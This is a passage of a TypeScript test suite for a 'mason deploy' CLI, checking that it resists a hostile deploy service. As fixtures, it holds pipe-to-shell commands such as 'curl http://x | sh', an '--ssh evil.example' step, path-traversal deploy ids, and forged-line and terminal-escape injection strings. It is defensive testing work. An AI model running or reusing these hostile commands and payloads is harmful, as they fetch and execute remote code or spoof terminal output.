      assert.equal(a.code, 1, `${what} ${argv.join(" ")}: ${a.stdout}${a.stderr}`);
      assert.deepEqual(requests, [], `${what}: nothing sent`);
      assert.doesNotMatch(a.stdout + a.stderr, /a bug in mason|\n\s+at /, `${what}: no crash`);
      if (argv.includes("--json")) {
        const e = (JSON.parse(a.stdout) as { error: { code: string; message: string; why: string; fix: string } }).error;
        assert.equal(e.code, "refused", what);
        assert.match(e.message, /^this project's files cannot be found: \.mason\/config\.json names "folder": ".*", which cannot be resolved$/, what);
        assert.match(e.why, why, what);
        assert.match(e.fix, /^set "folder" in \.mason\/config\.json to the project's folder, a folder of its own inside /, what);
      } else {
        assert.match(a.stderr, /^✗ mason deploy: this project's files cannot be found: \.mason\/config\.json names "folder": /m, what);
        assert.match(a.stderr, why, what);
      }
    }
    if (process.getuid?.() !== 0 && fs.existsSync(path.join(root, "locked"))) fs.chmodSync(path.join(root, "locked"), 0o700);
  }
  // the words, whoever runs this (an unreadable folder cannot be made as root)
  // (read by name, so the file loads at a commit without it, and this test fails there by its name)
  const unresolvedWhy = (await import("../src/cli/project.ts") as Record<string, unknown>).unresolvedWhy as ((e: unknown) => string) | undefined;
  assert.equal(unresolvedWhy?.(Object.assign(new Error("x"), { code: "EACCES" })), "a folder on the way may not be read by this user (EACCES)");
});

test("mason deploy: the replica is --replica, else MASON_REPLICA, each part held to its grammar; neither names both ways", async () => {
  const { root } = project();
  let r = await deployWith({}, root, []);
  assert.equal(r.a.code, 2);
  assert.match(r.a.stderr, /^✗ mason deploy: no replica named\n {2}why {3}a deploy goes to one replica of the service\n {2}fix {3}name it: mason deploy --replica <org>\/<name>, or set MASON_REPLICA=<org>\/<name>\n\nusage: mason deploy/);
  assert.deepEqual(r.requests, []);
  for (const bad of ["acme", "Acme/shop", "acme/shop/x", "-acme/shop", "acme/", "../x/shop", `acme/${"a".repeat(64)}`]) {
    r = await deployWith({}, root, [`--replica=${bad}`, "--json"]);
    assert.equal(r.a.code, 2, bad);
    const e = (JSON.parse(r.a.stdout) as { error: { code: string; message: string } }).error;
    assert.equal(e.code, "usage", bad);
    assert.equal(e.message, `--replica ${JSON.stringify(bad)} is not <org>/<name>`);
    assert.deepEqual(r.requests, [], bad);
  }
  r = await deployWith({}, root, ["--json"], { MASON_REPLICA: "acme/Shop" });
  assert.equal(r.a.code, 1);
  assert.equal((JSON.parse(r.a.stdout) as { error: { code: string; message: string } }).error.message, 'MASON_REPLICA "acme/Shop" is not <org>/<name>');
  // MASON_REPLICA when no flag; the flag before it
  r = await deployWith({}, root, [], { MASON_REPLICA: "acme/shop" });
  assert.equal(r.a.code, 0, r.a.stderr);
  r = await deployWith({}, root, ["--replica", "acme/shop"], { MASON_REPLICA: "other/one" });
  assert.equal(r.a.code, 0, r.a.stderr);
  assert.ok(r.requests.every((q) => q.path.startsWith("/v1/replicas/acme/shop/")));
});

test("mason deploy: with no MASON_TOKEN and no login it says mason login and sends nothing; a saved login is used", async () => {
  const { root } = project();
  const fake = await fakeService({});
  try {
    const h = temp("mason-home-");
    let a = await mason(root, ["deploy", "--replica", "acme/shop"], envFor(h, fake.url));
    assert.equal(a.code, 1);
    assert.equal(a.stderr, `✗ mason deploy: this machine is not signed in to ${fake.url}\n` +
      "  why   a deploy is sent as a person signed in (mason login), or with a token in MASON_TOKEN (CI)\n" +
      "  fix   run mason login, then mason deploy again; in CI, set MASON_TOKEN to a CI token\n\n" +
      `Next:\n  mason login                                   sign this machine in to ${fake.url}\n`);
    assert.equal(fake.requests.length, 0);
    // a login saved for this service (mason login's file)
    const token = newToken(); SECRETS.push(token);
    const dir = path.join(h, ".config", "mason");
    fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
    fs.chmodSync(dir, 0o700);
    fs.writeFileSync(path.join(dir, "credentials.json"), JSON.stringify({ version: 1, logins: { [fake.url]: { token, email: "ada@example.com", savedAt: CREATED } } }), { mode: 0o600 });
    a = await mason(root, ["deploy", "--replica", "acme/shop"], envFor(h, fake.url));
    assert.equal(a.code, 0, a.stderr);
    assert.ok(fake.requests.length >= 2);
    assert.ok(fake.requests.every((q) => q.headers.authorization === `Bearer ${token}`));
  } finally { await fake.close(); }
});

test("mason deploy: each failure of the contract's POST says the service's words, its code the CLI's by the HTTP status, exit 1; an answer outside it by its status alone", async () => {
  const { root } = project();
  const cases: Array<[number, string, string, string]> = [
    [401, "unauthenticated", "this token is not one the service takes", "refused"],
    [403, "refused", "this token may not deploy acme/shop", "refused"],
    [404, "not_found", "no replica acme/shop", "not_found"],
    [409, "busy", "another deploy to acme/shop is running", "refused"],
    [413, "too_large", "the files are over 1 MiB", "refused"],
    [422, "invalid", "sources/shop.yml: its sha256 is not its content's", "refused"],
  ];
  for (const [status, code, message, ours] of cases) {
    // the service's next is never read: the step is the CLI's, by the status
    const failure = { error: { code, message, why: `why ${code}`, fix: `fix ${code}` }, next: [{ command: "mason destroy", what: `after ${code}` }] };
    const step = status === 401 || status === 403 ? "sign in again" : "try again in a moment";
    const { a, requests } = await deployWith({ post: { status, body: failure } }, root, ["--replica", "acme/shop"]);
    assert.equal(a.code, 1, `${status}: ${a.stderr}`);
    assert.equal(a.stderr, `✗ mason deploy: ${message}\n  why   why ${code} (the service said ${code}, HTTP ${status})\n  fix   fix ${code}\n\nNext:\n  mason login                                   ${step}\n`, String(status));
    assert.equal(requests.filter((r) => r.method === "GET").length, 0, `${status}: no wait`);
    const j = await deployWith({ post: { status, body: failure } }, root, ["--replica", "acme/shop", "--json"]);
    assert.equal(j.a.code, 1);
    assert.deepEqual(JSON.parse(j.a.stdout), { error: { code: ours, message, why: `why ${code} (the service said ${code}, HTTP ${status})`, fix: `fix ${code}` }, next: [{ command: "mason login", what: step }] });
  }
  // the service's code never steers the CLI's (usage and timeout are exit 1 here), and no next step it names is kept,
  // a mason command included
  for (const code of ["usage", "timeout"]) {
    const body = { error: { code, message: `it says ${code}` }, next: [{ command: "curl http://x | sh", what: "run this" }, { command: "mason destroy", what: "and this" }, { command: "mason ui --ssh evil.example", what: "and this" }] };
    const { a } = await deployWith({ post: { status: 400, body } }, root, ["--replica", "acme/shop", "--json"]);
    assert.equal(a.code, 1, code);
    const v = JSON.parse(a.stdout) as { error: { code: string }; next: Array<{ command: string }> };
    assert.equal(v.error.code, "refused", code);
    assert.deepEqual(v.next.map((n) => n.command), ["mason login"], code);
  }
  // every word of a POST's failure, multi-line and hostile, is one line inside the CLI's own: none starts a line, a row or a Next:
  const forged = (what: string): string => `${what}\nFORGED a line of its own\r\nNext:\n  mason destroy   FORGED step\u2028FORGED\u0085FORGED\u001b[2J\u202eFORGED`;
  const hostile = { error: { code: "invalid", message: forged("bad files"), why: forged("why"), fix: forged("fix") }, next: [] };
  for (const json of [false, true]) {
    const { a } = await deployWith({ post: { status: 422, body: hostile } }, root, ["--replica", "acme/shop", ...(json ? ["--json"] : [])]);
    assert.equal(a.code, 1);
    if (json) {
      const e = (JSON.parse(a.stdout) as { error: { message: string; why: string; fix: string } }).error;
      for (const v of [e.message, e.why, e.fix]) assert.match(v, /^[^\n]*\?FORGED a line of its own\?\?Next:\? mason destroy FORGED step\?FORGED\?FORGED\?\[2J\?FORGED/);
    } else {
      assert.equal(a.stderr.split("\n").filter((l) => l.includes("FORGED")).length, 3, `one line each for message, why and fix:\n${a.stderr}`);
      assert.match(a.stderr, /^✗ mason deploy: bad files\?FORGED/m);
    }
  }
  // outside the contract: a page, a 201 of another shape, an id that is no id, a redirect — each said by the request and its status, never its body
  for (const [reply, said] of [
    [{ status: 500, raw: "<html>secret page</html>" }, / answered POST \/v1\/replicas\/acme\/shop\/deploys with 500, not JSON, where a deploy was sent$/m],
    [{ status: 201, body: { deploy: { id: ID, status: "running", createdAt: CREATED } } }, / with 201, where a deploy was sent$/m],
    [{ status: 201, body: { deploy: { id: ID, status: "deploying", createdAt: CREATED } } }, / with 201, where a deploy was sent$/m],
    [{ status: 307, headers: { location: "http://127.0.0.1:1/x" } }, / answered POST \/v1\/replicas\/acme\/shop\/deploys with a redirect \(307\)$/m],
  ] as Array<[Reply, RegExp]>) {
    const { a, requests } = await deployWith({ post: reply }, root, ["--replica", "acme/shop"]);
    assert.equal(a.code, 1, a.stderr);
    assert.match(a.stderr, said);
    assert.doesNotMatch(a.stderr, /secret page/);
    assert.equal(requests.length, 1, "nothing followed, nothing polled");
  }
  // an id the next request would put in its path: anything but [A-Za-z0-9_-]{1,64} is refused before any request is made of it
  for (const id of ["../../etc", "x/../../v1/me", "//evil.example/x", "a?b=1", "a#b", "%2e%2e", "a b", "", "x".repeat(65)]) {
    const { a, requests } = await deployWith({ post: { status: 201, body: { deploy: { id, status: "queued", createdAt: CREATED } } } }, root, ["--replica", "acme/shop"]);
    assert.equal(a.code, 1, JSON.stringify(id));
    assert.match(a.stderr, / answered POST \/v1\/replicas\/acme\/shop\/deploys with 201, where a deploy was sent$/m, JSON.stringify(id));
    assert.deepEqual(requests.map((r) => `${r.method} ${r.path}`), ["POST /v1/replicas/acme/shop/deploys"], `${JSON.stringify(id)}: no request steered by it`);
  }
});

test("mason deploy: the phases are said as they change, in the CLI's words, then the outcome; a 503 or no answer midway is a wait, never an outcome", async () => {
  const { root } = project();
  const steps = [at("queued"), at("applying", { phase: "checking" }), at("applying", { phase: "checking" }), at("starting"),
    { status: 503, raw: "busy" } as Reply, "drop" as Reply, at("starting", { phase: "syncing" }), at("running")];
  const { a, requests } = await deployWith({ get: (n) => steps[Math.min(n, steps.length - 1)]! }, root, ["--replica", "acme/shop"]);
  assert.equal(a.code, 0, a.stderr);
  assert.equal(requests.filter((r) => r.method === "GET").length, 8);
  const lines = a.stderr.trimEnd().split("\n");
  assert.equal(lines[0], `Sent 3 files (${lines[0]!.match(/\((\d+) bytes\)/)![1]} bytes) to acme/shop on ${a.stderr.match(/on (http:\/\/127\.0\.0\.1:\d+)/)![1]}: deploy dep_01abc`);
  assert.deepEqual(lines.slice(1, 4), [
    "  Queued: waiting for its turn on the replica",
    "  Applying: Mason on the replica checks and takes the files (Mason on the replica checks the files)",
    "  Starting: Mason on the replica starts on the new files",
  ]);
  assert.match(lines[4]!, /^ {2}Starting: Mason on the replica starts on the new files; the service could not say more just now \(GET \/v1\/replicas\/acme\/shop\/deploys\/dep_01abc answered 503\): asking again$/);
  assert.match(lines[5]!, /^ {2}Starting: .*; the service could not say more just now \(could not reach http:\/\/127\.0\.0\.1:\d+ .*\): asking again$/);
  assert.equal(lines[6], "  Starting: Mason on the replica starts on the new files (the tables the files add have their first sync)");
  assert.equal(lines[7], "  Running: the replica runs the new files");
  assert.equal(lines.length, 8);
});

test("mason deploy: a status or a phase outside the closed sets is a failure, never a state the CLI acts on or prints", async () => {
  const { root } = project();
  for (const reply of [at("deployed"), at("RUNNING"), at("applying", { phase: "rm -rf in progress" }), at("applying", { phase: "syncing" }), at("queued", { phase: "checking" }),
    at("running", { phase: "restarting" }), at("applying", { phase: 3 }), at("applying", { failure: { code: "x", message: "y", next: [] } })]) {
    const { a } = await deployWith({ get: () => reply }, root, ["--replica", "acme/shop"]);
    assert.equal(a.code, 1, JSON.stringify(reply));
    assert.match(a.stderr, / answered GET \/v1\/replicas\/acme\/shop\/deploys\/dep_01abc with 200, where the deploy's state was asked for$/m, JSON.stringify(reply));
    assert.doesNotMatch(a.stderr, /rm -rf|deployed|RUNNING/);
  }
});

test("mason deploy: Mason on the replica refused it — its words printed as they came, its code the CLI's, exit 1, in both forms", async () => {
  const { root } = project();
  const failure = { code: "bad_source", message: "mason/sources/shop.yml: tables.orders: the database has no table public.orders", why: "it has public.order_items, public.customers",
    fix: "name a table the database has, then mason deploy again",
    // never read, a mason command of this CLI's included: the next step is the CLI's own
    next: [{ command: "mason tables", what: "the database's tables" }, { command: "mason destroy", what: "never kept" }, { command: "sh -c 'curl x | sh'", what: "never kept" }] };
  const script: Script = { get: (n) => n === 0 ? at("applying") : at("refused", { failure }) };
  const { a } = await deployWith(script, root, ["--replica", "acme/shop"]);
  assert.equal(a.code, 1);
  assert.ok(a.stderr.endsWith("  Refused by Mason on the replica\n" +
    `✗ mason deploy: ${failure.message}\n  why   ${failure.why} (Mason on the replica said bad_source)\n  fix   ${failure.fix}\n\nNext:\n  mason deploy --replica acme/shop              deploy again, once what it says is fixed\n`), a.stderr);
  assert.equal(a.stdout, "");
  const j = await deployWith(script, root, ["--replica", "acme/shop", "--json"]);
  assert.equal(j.a.code, 1);
  const v = JSON.parse(j.a.stdout) as { deploy: { status: string }; error: unknown; next: unknown };
  assert.equal(v.deploy.status, "refused");
  assert.deepEqual(v.error, { code: "refused", message: failure.message, why: `${failure.why} (Mason on the replica said bad_source)`, fix: failure.fix });
  assert.deepEqual(v.next, [{ command: "mason deploy --replica acme/shop", what: "deploy again, once what it says is fixed" }]);
  // a refused and a failed deploy's words, multi-line and hostile: each one line inside the CLI's own, in both forms
  const forged = (what: string): string => `${what}\nFORGED line\r\n\nNext:\n  mason destroy\u2028FORGED\u0085FORGED\u200bx\u202eFORGED\u001b[31mFORGED`;
  for (const status of ["refused", "failed"]) {
    const bad = { code: "bad_source", message: forged("message"), why: forged("why"), fix: forged("fix"), next: [{ command: "mason destroy" }] };
    for (const json of [false, true]) {
      const r = await deployWith({ get: () => at(status, { failure: bad }) }, root, ["--replica", "acme/shop", ...(json ? ["--json"] : [])]);
      assert.equal(r.a.code, 1, `${status} ${json}`);
      if (json) {
        const e = (JSON.parse(r.a.stdout) as { error: { code: string; message: string; why: string; fix: string } }).error;
        assert.equal(e.code, status);
        assert.equal(e.message, "message?FORGED line???Next:? mason destroy?FORGED?FORGED?x?FORGED?[31mFORGED");
      } else {
        assert.equal(r.a.stderr.split("\n").filter((l) => l.includes("FORGED")).length, 3, `${status}: one line each for message, why and fix:\n${r.a.stderr}`);
        assert.doesNotMatch(r.a.stderr, /\u001b\[31m|\u202e|\u200b/);
      }
    }
  }
  // the service's code never sets the exit: a failed deploy that says timeout or usage is code failed, exit 1
  for (const code of ["timeout", "usage"]) {
    const t = await deployWith({ get: () => at("failed", { failure: { code, message: "the machine did not start", next: [] } }) }, root, ["--replica", "acme/shop", "--json"]);
    assert.equal(t.a.code, 1, code);
    assert.deepEqual((JSON.parse(t.a.stdout) as { error: unknown }).error, { code: "failed", message: "the machine did not start", why: `the service said ${code}` });
  }
  // a refusal without its failure, or a state for another id, is outside the contract
  for (const reply of [at("refused"), { status: 200, body: { deploy: { id: "dep_other", status: "running", createdAt: CREATED } } } as Reply]) {
    const r = await deployWith({ get: () => reply }, root, ["--replica", "acme/shop"]);
    assert.equal(r.a.code, 1);
    assert.match(r.a.stderr, / answered GET \/v1\/replicas\/acme\/shop\/deploys\/dep_01abc with 200, where the deploy's state was asked for$/m);
  }
  // a GET the service refuses (the token revoked meanwhile): its words, the CLI's code, mason login among the next steps
  const g = await deployWith({ get: () => ({ status: 401, body: { error: { code: "timeout", message: "this token was revoked" }, next: [] } }) }, root, ["--replica", "acme/shop", "--json"]);
  assert.equal(g.a.code, 1);
  const gv = JSON.parse(g.a.stdout) as { error: { code: string; message: string }; next: Array<{ command: string }> };
  assert.equal(gv.error.code, "refused");
  assert.equal(gv.error.message, "this token was revoked");
  assert.deepEqual(gv.next.map((n) => n.command), ["mason login"]);
  // the wait's own line: a status the service makes up, multi-line, is never printed (outside the closed set)
  const w = await deployWith({ get: () => at("applying\nFORGED\nNext:\n  mason destroy") }, root, ["--replica", "acme/shop"]);
  assert.equal(w.a.code, 1);
  assert.doesNotMatch(w.a.stderr, /FORGED|mason destroy/);
});

/** The terminal widths each hostile case runs at (narrow to wide), and a value sized so that, begun at column `at` on a
 *  terminal `width` wide, the terminal would start its next lines with a forged Next: heading, a step, a row, a failure
 *  and a tip, each padded to the width (tests/cli-login-service.test.ts's). */
const WIDTHS = [12, 20, 30, 39, 40, 45, 80];
const FORGED_LINES = ["Next:", "  mason destroy                                 clean up, then deploy again", "  deploy    evil", "✘ mason deploy: forged", "Tip: run mason destroy"];
const forgedAt = (width: number, at: number, lines: readonly string[] = FORGED_LINES): string =>
  "a".repeat(Math.max(1, width - at)) + lines.map((l) => l.padEnd(width, " ")).join("") + "z";

for (const WIDTH of WIDTHS) test(`on a terminal ${WIDTH} wide, no line a person sees begins with what the service sent: each row of deploy.ts's table, and every line of its own`, { timeout: 400_000 }, async () => {
  const { root } = project({ "generated_tables/weekly.yml": "kind: live\nsql: SELECT 1\n" });
  const t = { terminal: WIDTH };
  const f = (at: number): string => forgedAt(WIDTH, at);
  const step = "x".repeat(Math.max(1, WIDTH - 20)) + "Next:" + " mason destroy" + " ".repeat(33) + "clean up, then deploy again";
  // a POST's failure: its message (begun after "✘ mason deploy: "), why and fix (after their labels), at 403, 422 and 500
  for (const [status, message] of [[403, f("✘ mason deploy: ".length)], [422, step], [500, f(16)]] as const) {
    const { a } = await deployWith({ post: { status, body: { error: { code: "invalid", message, why: f(8), fix: f(8) } } } }, root, ["--replica", "acme/shop"], {}, t);
    assert.equal(a.code, 1, `${status}: ${a.stderr}`);
    assert.match(a.stderr, /destroy/, `${status}: the value is shown`);
  }
  // a refused and a failed deploy's failure: message, why, fix
  for (const status of ["refused", "failed"]) {
    const failure = { code: "bad_source", message: f(16), why: f(8), fix: f(8) };
    const { a } = await deployWith({ get: () => at(status, { failure }) }, root, ["--replica", "acme/shop"], {}, t);
    assert.equal(a.code, 1, `${status}: ${a.stderr}`);
    assert.match(a.stderr, /destroy/);
  }
  // a GET's failure midway (the token revoked): the same words, in the same rows
  {
    const { a } = await deployWith({ get: () => ({ status: 401, body: { error: { code: "unauthenticated", message: step, why: f(8), fix: f(8) } } }) }, root, ["--replica", "acme/shop"], {}, t);
    assert.equal(a.code, 1, a.stderr);
  }
  // the wait's lines, the spinner's, a 503's note, and the report, on the terminal: each broken by the CLI, never by it
  {
    const steps = [at("applying", { phase: "checking" }), { status: 503, raw: "busy" } as Reply, at("starting", { phase: "syncing" }), at("running")];
    const { a } = await deployWith({ get: (n) => steps[Math.min(n, steps.length - 1)]! }, root, ["--replica", "acme/shop"], {}, t);
    assert.equal(a.code, 0, a.stderr);
    assert.match(a.stderr, /Running:/);
  }
  // the timeout's failure, the dry run's rows (each a file and its 64-digit sha256), and a warning, on the terminal
  {
    const { a } = await deployWith({ get: () => at("applying") }, root, ["--replica", "acme/shop", "--timeout", "1s"], {}, t);
    assert.equal(a.code, 124, a.stderr);
    const d = await deployWith({}, root, ["--replica", "acme/shop", "--dry-run"], {}, t);
    assert.equal(d.a.code, 0, d.a.stderr);
    assert.match(d.a.stderr, /^ {2}!( |$)/m);
  }
});

test("mason deploy --timeout: past it, exit 124 naming the deploy's id and that it may still finish; a timeout that is not an interval is a wrong line", async () => {
  const { root } = project();
  const { a } = await deployWith({ get: () => at("applying") }, root, ["--replica", "acme/shop", "--timeout", "1s"]);
  assert.equal(a.code, 124, a.stderr);
  assert.match(a.stderr, /^✗ mason deploy: deploy dep_01abc to acme\/shop did not finish within 1s\n {2}why {3}it was last: (Queued|Applying)[^\n]*\n {2}fix {3}nothing was stopped, and it may still finish: the service's web app shows deploy dep_01abc of acme\/shop, as GET \/v1\/replicas\/acme\/shop\/deploys\/dep_01abc does \(the hosted API\); a longer wait is --timeout 30m\n$/m);
  const j = await deployWith({ get: () => at("applying") }, root, ["--replica", "acme/shop", "--timeout", "1s", "--json"]);
  assert.equal(j.a.code, 124);
  const v = JSON.parse(j.a.stdout) as { deploy: { id: string }; error: { code: string } };
  assert.equal(v.deploy.id, ID);
  assert.equal(v.error.code, "timeout");
  for (const bad of ["0s", "abc", "10", "1.5m", "2d"]) {
    const r = await deployWith({}, root, ["--replica", "acme/shop", "--timeout", bad]);
    assert.equal(r.a.code, 2, bad);
    assert.match(r.a.stderr, /^✗ mason deploy: --timeout /, bad);
    assert.deepEqual(r.requests, [], bad);
  }
});

test("mason deploy: needs a project — none here is the state's answer, nothing sent", async () => {
  const { a, requests } = await deployWith({}, temp("mason-empty-"), ["--replica", "acme/shop", "--json"]);
  assert.equal(a.code, 1);
  assert.equal((JSON.parse(a.stdout) as { error: { code: string } }).error.code, "no_project");
  assert.deepEqual(requests, []);
});

test("mason deploy: a service that echoes the token it was sent in another form — its body, split, re-cased, URL-encoded, a slice, pieces, a piece in each field — shows no more than a quarter of it in all, on stdout, stderr or in --json", { timeout: 300_000 }, async () => {
  const { root } = project();
  // one fixed token, so the verdict is the same on every run (tests/hosted-fake.ts echoToken)
  const token = echoToken("ci"); SECRETS.push(token);
  const words = ([m, w, f]: [string, string, string]) => ({ message: `the token ${m} is not known`, why: `it was sent as ${w}`, fix: `sign in again, not as ${f}` });
  // a refusal of the deploy sent, and a deploy Mason on the replica refused: the two failures the service words; a
  // person's stderr for the POST's, the refused deploy's in --json alone, its stderr read there too (each run of a
  // refused deploy waits out a poll, and its words go through the same failureShape)
  const runs = (fields: [string, string, string]): Array<[string, Script, boolean]> => [
    ["the POST's 401", { post: { status: 401, body: { error: { code: "unauthenticated", ...words(fields) }, next: [] } } }, false],
    ["the POST's 401", { post: { status: 401, body: { error: { code: "unauthenticated", ...words(fields) }, next: [] } } }, true],
    ["a refused deploy", { get: () => at("refused", { failure: { code: "bad_source", ...words(fields) } }) }, true],
  ];
  const deploy = (script: Script, json: boolean) => deployWith(script, root, ["--replica", "acme/shop", ...(json ? ["--json"] : [])], { MASON_TOKEN: token });
  // the CLI's own words share no run of the body: what is counted below is the echo's alone
  for (const [where, script, json] of runs(["it", "it", "it"])) {
    const { a, url, home } = await deploy(script, json);
    assert.equal(bodyCovered(`${a.stdout}\n${a.stderr}`, token, [root, url, home]), 0, `nothing echoed, in ${where}${json ? ", --json" : ""}: the fixed token shares a run with the CLI's own words:\n${a.stdout}${a.stderr}`);
  }
  for (const { what, fields, exact } of echoForms(token)) {
    for (const [where, script, json] of runs(fields)) {
      const { a, url, home } = await deploy(script, json);
      const at_ = `${what}, in ${where}${json ? ", --json" : ""}`;
      assert.equal(a.code, 1, `${at_}: ${a.stdout}${a.stderr}`);
      assert.ok(!bodyShown(`${a.stdout}\n${a.stderr}`, token, [root, url, home]), `${at_}: more than a quarter of the body is shown:\n${a.stdout}${a.stderr}`);
      // what is printed is the service's words, the echo masked: never dropped, never re-worded (where a mask may take
      // in a letter beside it that is the body's next, by chance, or one field is shown, the words are not held exact)
      const said = json ? (JSON.parse(a.stdout) as { error: { message: string; fix: string } }).error : null;
      if (!exact) assert.match(a.stdout + a.stderr, /\*{4}/, at_);
      else if (said) assert.deepEqual([said.message, said.fix], ["the token **** is not known", "sign in again, not as ****"], at_);
      else assert.match(a.stderr, /✗ mason deploy: the token \*\*\*\* is not known\n {2}why {3}it was sent as \*\*\*\* \(/, at_);
    }
  }
});

test("no run of mason deploy printed a token, nor anything shaped as one", () => {
  assert.ok(ANSWERS.length > 30, `the runs above are here (${ANSWERS.length})`);
  for (const a of ANSWERS) {
    for (const s of SECRETS) assert.ok(!a.stdout.includes(s) && !a.stderr.includes(s), `mason ${a.argv.join(" ")} printed a token`);
    assert.doesNotMatch(a.stdout + a.stderr, /masondata_(pat|ci)_[A-Za-z0-9_-]{43}/, `mason ${a.argv.join(" ")}`);
  }
});
